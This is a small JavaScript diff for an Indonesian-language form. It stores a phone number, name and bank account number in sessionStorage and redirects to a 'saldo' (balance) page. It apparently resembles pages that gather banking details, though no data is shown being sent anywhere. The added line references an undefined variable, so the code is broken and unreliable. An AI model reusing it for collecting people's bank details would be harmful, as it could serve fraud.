@@ -36,8 +36,8 @@ $('.process1').fadeIn();
   window.location.href='saldo.html'
   document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
-    var nomortel = document.getElementById('nomorku').value;
-    sessionStorage.setItem("nomortel", nomortel);    
+    var nomortel = document.getElementById('nohp').value;
+    sessionStorage.setItem("nomor", nomor);    
     var namanya = document.getElementById('nama').value;
     sessionStorage.setItem("namanya", namanya);    
     var noreke = document.getElementById('rek').value;
